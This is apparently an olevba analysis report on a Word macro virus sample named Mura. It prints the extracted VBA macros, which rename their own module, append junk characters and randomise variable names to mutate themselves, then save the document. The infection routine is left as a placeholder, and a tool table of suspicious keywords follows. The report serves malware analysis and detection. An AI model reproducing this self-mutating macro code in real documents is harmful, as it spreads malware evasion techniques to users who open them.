olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Mura-6c574620d9274e1762b73319ba85501bc65586ac
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Mura-6c574620d9274e1762b73319ba85501bc65586ac - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO OJJ.bas 
in file: Virus.MSWord.Mura-6c574620d9274e1762b73319ba85501bc65586ac - OLE stream: 'Macros/VBA/OJJ'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen2()
'daca nu este normal.dot ' jR '—_9
If ThisDocument.FullName <> NormalTemplate.FullName Then 'B@= '–2K
'schimba numele modulului '\LA '"†Œ
Randomize 'yw| 'A"Ž
WJUF = Chr(Int((25 * Rnd) + 65)) + Chr(Int((25 * Rnd) + 65)) + Chr(Int((25 * Rnd) + 65))
ActiveDocument.VBProject.VBComponents("OJJ").Name = WJUF ',R\ 'xˆ6
'cauta si schimba textul 'F*‚ '€1x
For QPIV = 2 To ActiveDocument.VBProject.VBComponents(WJUF).CodeModule.CountOfLines
XLKH = ActiveDocument.VBProject.VBComponents(WJUF).CodeModule.Lines(QPIV, 1) 'c•
If InStr(1, XLKH, "OJJ", vbTextCompare) Then 'X4e 'Cw;
XLKH = Replace(XLKH, "OJJ", WJUF, 1, -1, vbTextCompare) 'YL0 '=„g
ActiveDocument.VBProject.VBComponents(WJUF).CodeModule.ReplaceLine QPIV, XLKH 'Nt‰
End If '’‚9 'S>D
Next QPIV '?‰P 'y)€
'adauga caractere aleatoare la sfarsitul liniilor 'mnƒ 'RM_
YONR = ActiveDocument.VBProject.VBComponents.Item(WJUF).CodeModule.CountOfLines 'n]S
For QPIV = 2 To YONR - 1 'Jhe 'nz&
AYLK = ActiveDocument.VBProject.VBComponents(WJUF).CodeModule.Lines(QPIV, 1) 'c;H
If (Len(AYLK) < 80) Then 'ˆ'9 'k)6
ALDL = Chr(Int((120 * Rnd) + 32)) + Chr(Int((120 * Rnd) + 32)) + Chr(Int((120 * Rnd) + 32))
VFTQ = AYLK + " '" + ALDL 'yl4 '1Jt
ActiveDocument.VBProject.VBComponents.Item(WJUF).CodeModule.ReplaceLine QPIV, VFTQ
End If '‹�l '4‡[
Next QPIV 'x~~ 'r=€
Set FRFC = ActiveDocument.VBProject 'yrM 'M.“
Set KOES = FRFC.VBComponents(WJUF).CodeModule 'Œ“c '�^\
'vectorul cu numele variabilelor folosite 'O4W 'g�#
YONR = 13 'S‘G 'ho„
ReDim MURA(1 To YONR) As String 'ƒ+Œ ':^s
MURA(1) = "YONR": MURA(2) = "TWNE": MURA(3) = "MURA": MURA(4) = "AYLK" '€de 'h_
MURA(5) = "VFTQ": MURA(6) = "QPIV": MURA(7) = "FRFC": MURA(8) = "YITL" 'c€Ž '@,n
MURA(9) = "ALDL": MURA(10) = "WJUF": MURA(11) = "XLKH" '|]i '#;F
MURA(12) = "KOES": MURA(13) = "YMWI" '€U} '�n>
'modifica variabilele '70Q 'ƒ•(
For QPIV = 1 To YONR ';#G 'dVh
Randomize ' 82 '�"?
YMWI = Chr(Int((25 * Rnd) + 65)) + Chr(Int((25 * Rnd) + 65)) + Chr(Int((25 * Rnd) + 65)) + Chr(Int((25 * Rnd) + 65))
For TWNE = 2 To KOES.CountOfLines - 1 ''xP '�‘C
YITL = KOES.Lines(TWNE, 1) '^BH 'z|s
If InStr(1, YITL, MURA(QPIV), vbTextCompare) Then '%d\ 'UEE
YITL = Replace(YITL, MURA(QPIV), YMWI, 1, -1, vbTextCompare) '‡:% 'wq‹
KOES.ReplaceLine TWNE, YITL '@8e '’†I
End If '-“| '!]z
Next TWNE '5h€ ':Œ_
Next QPIV 'Xot '€ #
'salveaza ce ai schimbat '/‡i '—/+
ActiveDocument.Save 'sŠo 'w5”
End If ':'R 'k8€
'vezi daca e infectat documentul 'Q5ƒ ';ts
For QPIV = 1 To ActiveDocument.VBProject.VBComponents.Count 'XU} 'RDŽ
Set FRFC = ActiveDocument.VBProject '0U+ '•'6
Set KOES = FRFC.VBComponents(QPIV).CodeModule 'L&‘ '0"-
YONR = KOES.CountOfLines '/�o '{[“
If Not ((YONR < 61) And (YONR > 58)) Then ']X— 'XOr
msgbox "Nu e infectat: " + FRFC.VBComponents(QPIV).Name + Str(QPIV) 'Po1 'D�
'..........(rutina de infectie)............ '‚k1 'UN€
End If 'ZuU '#K'
Next QPIV 'Tfv '‡�‚
End Sub
-------------------------------------------------------------------------------
VBA MACRO CXN.bas 
in file: Virus.MSWord.Mura-6c574620d9274e1762b73319ba85501bc65586ac - OLE stream: 'Macros/VBA/CXN'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen2()
'daca nu este normal.dot
If ThisDocument.FullName <> NormalTemplate.FullName Then
'schimba numele modulului
Randomize
NumeModulNou = Chr(Int((25 * Rnd) + 65)) + Chr(Int((25 * Rnd) + 65)) + Chr(Int((25 * Rnd) + 65))
ActiveDocument.VBProject.VBComponents("CXN").Name = NumeModulNou
'cauta si schimba textul
For ik = 2 To ActiveDocument.VBProject.VBComponents(NumeModulNou).CodeModule.CountOfLines
linie = ActiveDocument.VBProject.VBComponents(NumeModulNou).CodeModule.Lines(ik, 1)
If InStr(1, linie, "CXN", vbTextCompare) Then
linie = Replace(linie, "CXN", NumeModulNou, 1, -1, vbTextCompare)
ActiveDocument.VBProject.VBComponents(NumeModulNou).CodeModule.ReplaceLine ik, linie
End If
Next ik
'adauga caractere aleatoare la sfarsitul liniilor
nr = ActiveDocument.VBProject.VBComponents.Item(NumeModulNou).CodeModule.CountOfLines
For ik = 2 To nr - 1
linieorig = ActiveDocument.VBProject.VBComponents(NumeModulNou).CodeModule.Lines(ik, 1)
If (Len(linieorig) < 80) Then
caracteraleator = Chr(Int((120 * Rnd) + 32)) + Chr(Int((120 * Rnd) + 32)) + Chr(Int((120 * Rnd) + 32))
linienoua = linieorig + " '" + caracteraleator
ActiveDocument.VBProject.VBComponents.Item(NumeModulNou).CodeModule.ReplaceLine ik, linienoua
End If
Next ik
Set char1 = ActiveDocument.VBProject
Set char2 = char1.VBComponents(NumeModulNou).CodeModule
'vectorul cu numele variabilelor folosite
nr = 13
ReDim suk(1 To nr) As String
suk(1) = "nr": suk(2) = "bkup": suk(3) = "suk": suk(4) = "linieorig"
suk(5) = "linienoua": suk(6) = "ik": suk(7) = "char1": suk(8) = "nam1"
suk(9) = "caracteraleator": suk(10) = "NumeModulNou": suk(11) = "linie"
suk(12) = "char2": suk(13) = "strip"
'modifica variabilele
For ik = 1 To nr
Randomize
strip = Chr(Int((25 * Rnd) + 65)) + Chr(Int((25 * Rnd) + 65)) + Chr(Int((25 * Rnd) + 65)) + Chr(Int((25 * Rnd) + 65))
For bkup = 2 To char2.CountOfLines - 1
nam1 = char2.Lines(bkup, 1)
If InStr(1, nam1, suk(ik), vbTextCompare) Then
nam1 = Replace(nam1, suk(ik), strip, 1, -1, vbTextCompare)
char2.ReplaceLine bkup, nam1
End If
Next bkup
Next ik
'salveaza ce ai schimbat
ActiveDocument.Save
End If
'vezi daca e infectat documentul
For ik = 1 To ActiveDocument.VBProject.VBComponents.Count
Set char1 = ActiveDocument.VBProject
Set char2 = char1.VBComponents(ik).CodeModule
nr = char2.CountOfLines
If Not ((nr < 61) And (nr > 58)) Then
msgbox "Nu e infectat: " + char1.VBComponents(ik).Name
'..........(rutina de infectie)............
End If
Next ik
End Sub
-------------------------------------------------------------------------------
VBA MACRO pgp.bas 
in file: Virus.MSWord.Mura-6c574620d9274e1762b73319ba85501bc65586ac - OLE stream: 'Macros/VBA/pgp'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
-----BEGIN PGP PUBLIC KEY BLOCK-----
Version: PGPfreeware 7.0.3 for non-commercial use <http://www.pgp.com>

mQGiBD0YSq0RBADw9CcvqB0Q12H3t69Ped0ra1FaU6peeInGn8jpuWckVskNNozn
7 aWq7LelGNFkpgDZtGGcfgg9xWuk wF3KGDtonG + kXkHPCwR75 / NTl36yK + v7fW3
0sbQyA2hqeDZMW3YepGKVp+6cEohks8oxBbLhiIrJlaj1GXA6S4fYxdpfQCg/+D1
o4Ko9Xl34hGp7YpAPmKrRKMD/jcpqc+K85EQdi6P4rRJ/guAi8C2fkgP82cXshPd
ry+V6gZC8hXy/UGOn1Uff+0Rmf5YR3tClj9y9Vqh7IuJUzrqacMuRuT5XjMJJ8ZO
vFSGoD7n001RXDNQp/2KokxxTuwllxzc7gOsMhfRJqVPxyNUF36jhLA9JhnZ7kZh
pymhA/46DpXHzUaPNqflkoZGl8zciNz71dOq/3TvyxB1FMoyQgRHaPxwyc+w1PGI
Uc/jdZzPaWve4ND+dNEowEP+BPpqgAYQjmxcvMnYJ5kSk6zxH+THjB3sg6oeDPg3
k2WlzB1NY3SpOWmUsj7EeqgY/NziTOIbUT6lOjP7Zowdn+xVdLQdTUlfcGlyYXQg
PE1JX3BpcmF0QHlhaG9vLmNvbT6JAEsEEBECAAsFAj0YSq0ECwMBAgAKCRCzvt3d
dYzJFM2GAKCSkiYq4arRnN82sv16UTSWAkQIYwCg3byZPdqHoG/JzMMlgdZjObND
o3S5Ag0EPRhKrRAIAPZCV7cIfwgXcqK61qlC8wXo+VMROU+28W65Szgg2gGnVqMU
6 Y9AVfPQB8bLQ6mUrfdMZIZJ AyDvWXpF9Sh01D49Vlf3HZSTz09jdvOmeFXklnN
/biudE/F/Ha8g8VHMGHOfMlm/xX5u/2RXscBqtNbno2gpXI61Brwv0YAWCvl9Ij9
WE5J280gtJ3kkQc2azNsOA1FHQ98iLMcfFstjvbzySPAQ/ClWxiNjrtVjLhdONM0
/XwXV0OjHRhs3jMhLLUq/zzhsSlAGBGNfISnCnLWhsQDGcgHKXrKlQzZlp+r0ApQ
mwJG0wg9ZqRdQZ cfL2JSyIZJrqrol7DVekyCzsAAgIIAIGtKCR4PnzCWopHbKcP
S4Sw5CJhACRG9ENqAWurW1HzWBnOrU2LJCxdmNcB86Q7/1G3uHZXIpSK34r9B7Ys
PKkTn QBbh5XtjEH / rViD8DbMAG1Sc5UYk3RE4O36msH2CjpUfN9sxJo0mzXSjYp
8AS9raSKJ97Wx9tMuCqcXQMBj7lZ4i6qJgxojRQXcuP5O9l/gpT4PEeY9stSZZf8
N09D90W5KJ37JNMDY0M5iBZ7PU8WRTf1iq8SFFXhrY6htPI4LrLyYIz8rpN/zHhn
hZgZyOkPS+0WFEgf6buIdDNF4R8W+c7DURH8U7ctKsA57pZKmw70+/WqMxCtAgro
ZxeJAD8DBRg9GEqts77d3XWMyRQRAvM7AKDQ1mCSPuLRPeWiGCDmzR0V3efUJwCg
/f57ub0z9ptrER92PmOJfRulz8s=
=vQZv
-----END PGP PUBLIC KEY BLOCK-----
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|XOr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |http://www.pgp.com  |URL                                          |
|Base64    |McD                 |TWNE                                         |
|String    |                    |                                             |
|Base64    |1D@                 |MURA                                         |
|String    |                    |                                             |
+----------+--------------------+---------------------------------------------+

